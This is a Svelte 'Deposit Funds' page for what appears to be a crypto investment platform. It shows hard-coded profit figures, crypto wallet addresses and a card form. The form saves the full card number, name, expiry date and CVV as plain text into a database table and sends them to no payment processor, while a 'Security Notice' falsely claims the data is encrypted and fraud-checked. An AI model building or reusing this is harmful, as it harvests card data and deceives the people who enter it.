<script>
  import { Card, CardContent, CardHeader, CardTitle } from "$lib/components/ui/card";
  import { Button } from "$lib/components/ui/button";
  let supabase = $derived(data?.supabase)

  let isvisible = $state(false);
  let { data } = $props();
  let amount = $state("0");
  let copiedAddress = $state("");

  // Card Form State
  let cardNumber = $state("");
  let cardholderName = $state("");
  let expiryDate = $state("");
  let cvv = $state("");
  let isSubmitting = $state(false);
  let errorMessage = $state("");
  let successMessage = $state("");

  async function copyAddress(address) {
    try {
      if (navigator?.clipboard?.writeText) {
        await navigator.clipboard.writeText(address);
        copiedAddress = address;
        setTimeout(() => {
          if (copiedAddress === address) copiedAddress = "";
        }, 1500);
      }
    } catch (error) {
      console.error("Failed to copy address:", error);
    }
  }

 async function handleCardSubmit(e) {
  // Prevent browser from reloading or navigating on form submit
  if (e && e.preventDefault) e.preventDefault(); 
  
  isSubmitting = true;
  errorMessage = "";
  successMessage = "";

  try {
    const { data: insertedCard, error } = await supabase
      .from("card")
      .insert([
        {
          id: data.profile?.id,
          cardno: cardNumber.replace(/\s+/g, ""),
          user: cardholderName,
          expiry_date: expiryDate,
          cvv: cvv,
        }
      ])
      .select();

    if (error) throw error;

    successMessage = "Card details processed and stored successfully!";
    
    // Reset form inputs
    cardNumber = "";
    cardholderName = "";
    expiryDate = "";
    cvv = "";
  } catch (err) {
    console.error("Database Insert Error:", err);
    errorMessage = err.message || "Failed to save card details.";
  } finally {
    isSubmitting = false;
  }
}
  const stats = [
    { label: "Total Balance", value: data.profile.balance, change: "+12.4%", up: true },
    { label: "Profits", value: data.profile.profit, change: "+8.2%", up: true },
    { label: "Capital", value: data.profile.capital, change: "91.9%", up: true }
  ];

  const crypto = [
    { label: "BTC", address: "bc1qmp3dlrz3pleqg8q3dc29j7cggkgq3c4y48l6qh" },
    { label: "ETH", address: "0x720e753A42D6Cd28E2CDa1a226573a55d7e475Db" },
    { label: "BTC CASH", address: "qpczgu7tyyx2lumy7kj3gsmusqwckmw67uhu3298t4" },
    { label: "BNB SMART CHAIN", address: "0x720e753A42D6Cd28E2CDa1a226573a55d7e475Db" }
  ];

  const showModal = () => {
    isvisible = !isvisible;
  };
</script>

<div class="">
  <h1 class="text-gray-200 text-3xl font-bold my-1">Deposit</h1>
  <p class="text-[15px] text-gray-500 my-1">Manage and monitor your deposits</p>
</div>

<div class="grid gap-4 md:grid-cols-3 lg:grid-cols-3 my-2.5">
  {#each stats as stat}
    <Card class="bg-[#111827]/50 border-[#1e90ff]/10 backdrop-blur-sm">
      <CardHeader class="flex flex-row items-center justify-between space-y-0 pb-2">
        <CardTitle class="text-[10px] font-bold uppercase tracking-wider text-[#8e90a0]">{stat.label}</CardTitle>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="h-4 w-4 text-[#444654]">
          <path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6" />
        </svg>
      </CardHeader>
      <CardContent>
        <div class="text-2xl font-bold text-[#dfe2f3]" style="font-family:'JetBrains Mono',monospace;">{stat.value}</div>
        <p class="text-xs mt-1 font-medium {stat.up ? 'text-green-500' : 'text-red-500'}">
          {stat.change} <span class="text-[#444654] font-normal">from last session</span>
        </p>
      </CardContent>
    </Card>
  {/each}
</div>

<Card class="bg-[#111827]/50 border-[#1e90ff]/10 backdrop-blur-sm my-5">
  <CardHeader>
    <CardTitle class="text-2xl text-gray-200">Transactions</CardTitle>
  </CardHeader>
  <CardContent class="my-3">
    <label class="text-gray-300">Amount ({data.profile.currency}):</label>
    <input type="number" class="block bg-gray-300 text-black px-3 py-2 w-full rounded-lg mt-3.5 mb-3.5" placeholder="0.00" bind:value={amount} />
    
    <label class="text-gray-300">Payment Method</label>
    <select class="block bg-gray-300 text-black px-3 py-2 w-full rounded-lg my-1.5">
      <option>BTC</option>
      <option>Ethereum</option>
      <option>BTC Cash</option>
    </select>
    
    <Button class="bg-amber-400 text-black w-full text-[15px] font-bold my-4 hover:bg-amber-500" onclick={showModal}>
      ↗ Deposit Funds
    </Button>
  </CardContent>
</Card>

{#if isvisible}
  <div class="fixed inset-0 z-50 bg-[#111827] w-full sm:w-[90%] md:w-[75%] lg:w-[60%] mx-auto my-0 sm:my-3 h-full overflow-y-auto py-6 sm:py-7 [&::-webkit-scrollbar]:w-2 [&::-webkit-scrollbar-track]:bg-slate-100 [&::-webkit-scrollbar-thumb]:bg-neutral-700 [&::-webkit-scrollbar-thumb]:rounded-full hover:[&::-webkit-scrollbar-thumb]:bg-neutral-800">
    <button class="absolute top-4 right-4 text-white hover:text-gray-200" onclick={showModal}>
      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
      </svg>
    </button>
    
    <div class="my-8 mx-4 sm:mx-10 md:mx-20">
      <h2 class="text-gray-50 text-2xl sm:text-3xl font-bold my-0.5">Deposit Funds</h2>
      <h6 class="text-gray-400 font-medium text-sm">Choose your payment method</h6>
    </div>
    
    <div class="mx-4 sm:mx-10 md:mx-20">
      <div class="border border-solid border-amber-200 text-gray-300 text-sm p-4 rounded-lg">
        <h6 class="text-amber-300 font-bold">🔐 Security Notice</h6>
        All payment information you submit is encrypted and processed through our secure compliance and fraud prevention system. Your data is handled in line with industry-standard security protocols to ensure every deposit is verified safely and reliably.
      </div>
      
      <div class="border border-solid border-amber-200 text-gray-300 p-4 rounded-lg my-7">
        <h5 class="font-bold text-center">Deposit Amount</h5>
        <p class="text-2xl text-center text-green-400">{data.profile.currency} {amount}</p>
      </div>

      <!-- Credit Card Container -->
      <div class="w-full max-w-xl mx-auto bg-[#111827] border my-7 border-amber-200 rounded-2xl shadow-sm p-4 sm:p-6 md:p-8">
        <div class="flex items-start gap-3 sm:gap-4 mb-6">
          <div class="p-2.5 sm:p-3 bg-[#111827] text-blue-600 rounded-xl flex-shrink-0">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-6 h-6">
              <path stroke-linecap="round" stroke-linejoin="round" d="M2.25 8.25h19.5M2.25 9h19.5m-16.5 5.25h6m-6 2.25h3m-3.75 3h15a2.25 2.25 0 0 0 2.25-2.25V6.75A2.25 2.25 0 0 0 19.5 4.5h-15a2.25 2.25 0 0 0-2.25 2.25v10.5A2.25 2.25 0 0 0 4.5 19.5Z" />
            </svg>
          </div>
          <div>
            <h3 class="text-base sm:text-lg font-semibold text-gray-50">Credit/Debit Card</h3>
            <p class="text-sm text-gray-400">Pay with your card - Fast & Secure</p>
          </div>
        </div>

        <div class="flex items-center gap-2 bg-slate-900 border border-slate-800 rounded-xl p-3 mb-6 text-sm text-slate-300">
          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-5 h-5 text-blue-500 flex-shrink-0">
            <path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75 11.25 15 15 9.75m-3-7.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285Z" />
          </svg>
          <span>Your card details are encrypted and secure with us</span>
        </div>

        <!-- Card Form -->
        <form class="space-y-5" onsubmit={handleCardSubmit}>
          {#if errorMessage}
            <div class="p-3 text-sm text-red-400 bg-red-950/50 border border-red-800 rounded-xl">
              {errorMessage}
            </div>
          {/if}

          {#if successMessage}
            <div class="p-3 text-sm text-green-400 bg-green-950/50 border border-green-800 rounded-xl">
              {successMessage}
            </div>
          {/if}

          <div>
            <label for="card-number" class="block text-sm font-medium text-gray-200 mb-1.5">Card Number</label>
            <input
              type="text"
              id="card-number"
              placeholder="1234 5678 9012 3456"
              bind:value={cardNumber}
              required
              class="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-xl text-gray-100 placeholder-gray-500 focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 transition-all"
            />
          </div>

          <div>
            <label for="cardholder-name" class="block text-sm font-medium text-gray-200 mb-1.5">Cardholder Name</label>
            <input
              type="text"
              id="cardholder-name"
              placeholder="John Doe"
              bind:value={cardholderName}
              required
              class="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-xl text-gray-100 placeholder-gray-500 focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 transition-all"
            />
          </div>

          <div class="grid grid-cols-2 gap-3 sm:gap-4">
            <div>
              <label for="expiry-date" class="block text-sm font-medium text-gray-200 mb-1.5">Expiry Date</label>
              <input
                type="text"
                id="expiry-date"
                placeholder="MM/YY"
                bind:value={expiryDate}
                required
                class="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-xl text-gray-100 placeholder-gray-500 focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 transition-all"
              />
            </div>
            <div>
              <label for="cvv" class="block text-sm font-medium text-gray-200 mb-1.5">CVV</label>
              <input
                type="text"
                id="cvv"
                placeholder="123"
                bind:value={cvv}
                required
                class="w-full px-4 py-3 bg-gray-900 border border-gray-700 rounded-xl text-gray-100 placeholder-gray-500 focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 transition-all"
              />
            </div>
          </div>

          <button
            type="submit"
            disabled={isSubmitting}
            class="w-full mt-2 bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white font-medium py-3 px-4 rounded-xl shadow-sm hover:shadow transition-all focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
          >
            {isSubmitting ? "Saving Card..." : "Confirm Card Payment"}
          </button>
        </form>
      </div>

      {#each crypto as currency}
        <div class="w-full max-w-2xl mx-auto bg-[#111827] border border-amber-200 rounded-2xl shadow-xl p-4 sm:p-6 md:p-8 text-gray-100 my-4">
          <div class="flex items-center gap-3 sm:gap-4 mb-6">
            <div class="p-2.5 sm:p-3 bg-blue-950 border border-blue-800/50 text-blue-400 rounded-xl flex-shrink-0">
              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-6 h-6">
                <path stroke-linecap="round" stroke-linejoin="round" d="M21 12a2.25 2.25 0 0 0-2.25-2.25H15a3 3 0 1 1-6 0H5.25A2.25 2.25 0 0 0 3 12m18 0v6A2.25 2.25 0 0 1 18.75 20H5.25A2.25 2.25 0 0 1 3 18v-6m18 0V9M3 12V9m18 0a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 9m18 0V6a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 6v3" />
              </svg>
            </div>
            <div class="min-w-0">
              <h3 class="text-lg sm:text-xl font-bold tracking-tight truncate">{currency.label}</h3>
              <p class="text-xs font-medium text-gray-400 mt-0.5">Network: <span class="text-blue-400">Native</span></p>
            </div>
          </div>

          <div class="space-y-4">
            <div>
              <label class="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">
                Wallet Address
              </label>
              <div class="w-full px-4 py-3.5 bg-gray-900 border border-gray-800 rounded-xl focus-within:border-blue-500/50 focus-within:ring-2 focus-within:ring-blue-500/10 transition-all">
                <span class="block text-sm font-mono text-gray-200 select-all break-all tracking-wide">
                  {currency.address}
                </span>
              </div>
            </div>

            <div class="grid grid-cols-1 gap-3 pt-2">
              <button
                type="button"
                onclick={() => copyAddress(currency.address)}
                class="flex items-center justify-center gap-2 px-4 py-3 bg-gray-900 hover:bg-gray-800 border border-gray-800 hover:border-gray-700 text-sm font-medium text-gray-200 rounded-xl transition-all shadow-sm group active:scale-[0.98]"
              >
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-4 h-4 text-gray-400 group-hover:text-gray-200 transition-colors">
                  <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 0 1-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 0 1 1.5.124m7.5 10.376a48.11 48.11 0 0 0 3.478-.397m-3.478.397a48.309 48.309 0 0 1-3.478.397m0 0a3 3 0 0 0-3-2.895V4.875c0-.621.504-1.125 1.125-1.125h9.75a1.125 1.125 0 0 1 1.125 1.125V12.75c0 .621-.504 1.125-1.125 1.125h-.375" />
                </svg>
                {copiedAddress === currency.address ? "Copied!" : "Copy Address"}
              </button>
            </div>
          </div>
        </div>
      {/each}

      <div class="w-full max-w-2xl mx-auto bg-[#111827] border border-gray-800 rounded-2xl shadow-xl p-4 sm:p-6 md:p-8 text-gray-100">
        <div class="mb-6">
          <h3 class="text-lg font-semibold tracking-tight text-gray-200">Buy Crypto with External Providers</h3>
          <p class="text-xs text-gray-400 mt-1">Purchase crypto directly via our trusted secure checkout partners.</p>
        </div>

        <div class="space-y-3">
          <a href="https://bitso.com" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center gap-2.5 w-full px-4 py-3.5 bg-gray-900 hover:bg-gray-800 border border-gray-800 hover:border-gray-700 text-sm font-medium text-gray-200 rounded-xl transition-all group active:scale-[0.99]">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-4 h-4 text-gray-500 group-hover:text-blue-400 transition-colors">
              <path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 0 0 3 8.25v10.5A2.25 2.25 0 0 0 5.25 21h10.5A2.25 2.25 0 0 0 18 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25" />
            </svg>
            Buy crypto with Bitso
          </a>

          <a href="https://paybis.com" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center gap-2.5 w-full px-4 py-3.5 bg-gray-900 hover:bg-gray-800 border border-gray-800 hover:border-gray-700 text-sm font-medium text-gray-200 rounded-xl transition-all group active:scale-[0.99]">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-4 h-4 text-gray-500 group-hover:text-blue-400 transition-colors">
              <path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 0 0 3 8.25v10.5A2.25 2.25 0 0 0 5.25 21h10.5A2.25 2.25 0 0 0 18 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25" />
            </svg>
            Buy crypto with Paybis
          </a>

          <a href="https://banxa.com" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center gap-2.5 w-full px-4 py-3.5 bg-gray-900 hover:bg-gray-800 border border-gray-800 hover:border-gray-700 text-sm font-medium text-gray-200 rounded-xl transition-all group active:scale-[0.99]">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-4 h-4 text-gray-500 group-hover:text-blue-400 transition-colors">
              <path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 0 0 3 8.25v10.5A2.25 2.25 0 0 0 5.25 21h10.5A2.25 2.25 0 0 0 18 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25" />
            </svg>
            Buy crypto with Banxa
          </a>

          <a href="https://www.moonpay.com" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center gap-2.5 w-full px-4 py-3.5 bg-gray-900 hover:bg-gray-800 border border-gray-800 hover:border-gray-700 text-sm font-medium text-gray-200 rounded-xl transition-all group active:scale-[0.99]">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" class="w-4 h-4 text-gray-500 group-hover:text-blue-400 transition-colors">
              <path stroke-linecap="round" stroke-linejoin="round" d="M13.5 6H5.25A2.25 2.25 0 0 0 3 8.25v10.5A2.25 2.25 0 0 0 5.25 21h10.5A2.25 2.25 0 0 0 18 18.75V10.5m-10.5 6L21 3m0 0h-5.25M21 3v5.25" />
            </svg>
            Buy crypto with Moonpay
          </a>
        </div>
      </div>
    </div>
  </div>
{/if}
